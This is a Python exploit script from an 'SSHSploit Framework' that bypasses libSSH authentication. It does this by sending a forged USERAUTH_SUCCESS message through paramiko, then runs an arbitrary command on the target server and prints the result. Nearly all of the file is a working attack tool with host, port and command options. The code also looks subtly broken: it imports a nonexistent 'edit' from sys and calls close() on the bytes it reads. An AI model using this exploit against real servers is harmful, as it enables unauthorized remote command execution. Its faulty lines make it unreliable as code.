#!/usr/bin/env python3

#            ---------------------------------------------------
#                            SSHSploit Framework                                                                  
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import paramiko
import socket
import argparse
import logging
import sys
from sys import edit

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass.")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port.', default=22)
parser.add_argument('-c', '--command', help='Command to execute.', default='id')
parser.add_argument('-log', '--logfile', help='Logfile to write conn logs.', default="paramiko.log")

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        spawncmd = transport.open_session(timeout=10)
        spawncmd.exec_command(command)
        
        stdout = spawncmd.makefile("rb", 2048)
        output = stdout.read()
        output.close()
        print(output)
        return 0
    
    except paramiko.SSHException as e:
        print("TCPForwarding disabled on remote/local server can't connect. Not Vulnerable")
        return 1
    except socket.error:
        print("Connection refused.")
        return 1


def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
        command = args.command
    except:
        parser.print_help()
        exit(1)
    BypasslibSSHwithoutcredentials(hostname, port, command)

if __name__ == '__main__':
    exit(main())
